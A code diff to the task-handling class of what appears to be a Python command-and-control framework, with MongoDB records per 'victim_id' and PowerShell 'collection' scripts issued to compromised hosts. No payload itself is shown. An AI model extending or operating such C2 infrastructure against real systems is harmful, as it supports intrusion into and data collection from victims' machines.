@@ -1,6 +1,7 @@
 import pdb
 import os
 import pathlib
+import sys
 from lib.module import Module
 
 class Task:
@@ -8,13 +9,14 @@ class Task:
 	mongoclient = None
 	tasks = {}
 
-	def __init__(self,victim_id,command,task_id,output=None,issued=False,add_db=True):
+	def __init__(self,victim_id,command,options,task_id,output=None,issued=False,add_db=True):
 
 		self.task_id = task_id
 		self.victim_id = victim_id
 		self.command = command
 		self.output = output
 		self.issued = issued
+		self.options = options
 		self.tasks[self.task_id] = self
 
 		if add_db : self.insert_cmd_db()
@@ -34,7 +36,7 @@ class Task:
 	@classmethod
 	def load_task(cls,task):
 		
-		task_obj = Task(victim_id = task['victim_id'], command = task['command'], task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
+		task_obj = Task(victim_id = task['victim_id'], command = task['command'], options = task['options'] , task_id = task['task_id'], output = task['output'],issued = task['issued'],add_db = False)
 		
 		cls.tasks[task_obj.task_id] = task_obj
 
@@ -49,17 +51,40 @@ class Task:
 		
 		tasks.find_one_and_update(h,{ "$set": {attribute : getattr(self,attribute)} })
 
-	## Returns the task in a dictionary to be issued by the server
+	## Updates the task issuance and output status from DB
+	def update_task_from_db(self):
+		mydb = self.mongoclient["pythonc2"]
+		tasks = mydb["tasks"]
+
+		h = {'task_id':self.task_id}
+		
+		task = tasks.find_one(h)
+
+		if task:
+			self.issued = task['issued']
+			self.output = task['output']
+
+	## Creates an object of the respective Module Class, loads in dict and returns needed info to be sent by server
 	def issue_dict(self):
 		language = 'powershell'
 		utility = 'collection'
 
-		module = Module(name = self.command , utility = utility, language = language)
-		module.load()
+		module_folder = os.path.join(str(pathlib.Path(__file__).parent.resolve()), "../modules",utility)
+
+		sys.path.append(module_folder)
+		mod = __import__(self.command)
+		
+		## capitalize the first letter
+		module_name = self.command.title()
+		
+		module_obj = getattr(mod,module_name)(name=self.command,utility = utility, language=language)
+		
+		## Storing the mapping to access later
+		Module.module_task_id[self.task_id] = module_obj
 
 		self.issued = True
 		self.update_task_to_db('issued')
-		return {'task_id': self.task_id, 'language': language, 'command': self.command, 'script': module.script}
+		return {'task_id': self.task_id, 'language': language, 'command': self.command, 'script': module_obj.script}
 
 	## Insert the command output in the Database
 	def insert_cmd_output(self,output):
@@ -78,6 +103,6 @@ class Task:
 		mydb = self.mongoclient["pythonc2"]
 		tasks = mydb["tasks"]
 
-		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'output':self.output ,'issued': self.issued}
+		h = {'task_id': self.task_id,'victim_id': self.victim_id, 'command':self.command, 'options':self.options, 'output':self.output ,'issued': self.issued}
 
 		tasks.insert_one(h)
